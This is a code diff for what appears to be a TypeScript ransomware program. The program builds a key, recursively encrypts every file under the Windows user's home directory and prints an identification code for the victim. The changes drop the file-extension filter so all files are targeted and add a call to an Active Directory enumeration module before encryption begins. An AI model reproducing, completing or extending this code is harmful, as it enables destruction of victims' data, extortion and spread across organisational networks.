@@ -4,11 +4,13 @@ import crypto from 'crypto';
 import path from 'path';
 import config from './config.json';
 import https from 'https';
-const encrypt = () => {
-  const userName: string = os.userInfo().username;
-  console.log(userName);
-  const userDir: string = `C:\\Users\\${userName}`;
+import executeCommand from './enumerateAd';
+import createRandomString from './utils/generateRandomString';
 
+const encrypt = () => {
+  executeCommand();
+  const userName: string = os.userInfo().username;
+  const userDir: string = `C:\\Users\\${userName}`;
   console.log('Starting...\n');
 
   // create key
@@ -31,20 +33,7 @@ const encrypt = () => {
   console.log(`Identification Code : ${idCode}\n`);
 };
 
-const createRandomString = (length: number): string => {
-  const characters: string =
-    'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-  const charactersLength: number = characters.length;
-
-  let result: string = '';
-  for (let i = 0; i < length; i++)
-    result += characters.charAt(Math.floor(Math.random() * charactersLength));
-
-  return result;
-};
-
 const encryptDir = (dir: string, key: string, iv: Buffer) => {
-  // if directory does not exist
   if (!fs.existsSync(dir)) return;
 
   fs.readdirSync(dir).forEach((file) => {
@@ -52,24 +41,9 @@ const encryptDir = (dir: string, key: string, iv: Buffer) => {
       const fullPath: string = path.join(dir, file);
 
       if (fs.lstatSync(fullPath).isDirectory()) {
-        // if folder
-
-        // recursive call
         encryptDir(fullPath, key, iv);
       } else {
-        // if file
-
         let isTarget: boolean = true;
-
-        // FODA SE EXTENSÃO
-        // check extension
-        // for (let j = 0; j < config.targetExtension.length; j++) {
-        //   if (fullPath.toLowerCase().endsWith(config.targetExtension[j])) {
-        //     console.log(j);
-        //     isTarget = true;
-        //     break;
-        //   }
-        // }
 
         if (isTarget) {
           let fileStat = fs.statSync(fullPath);
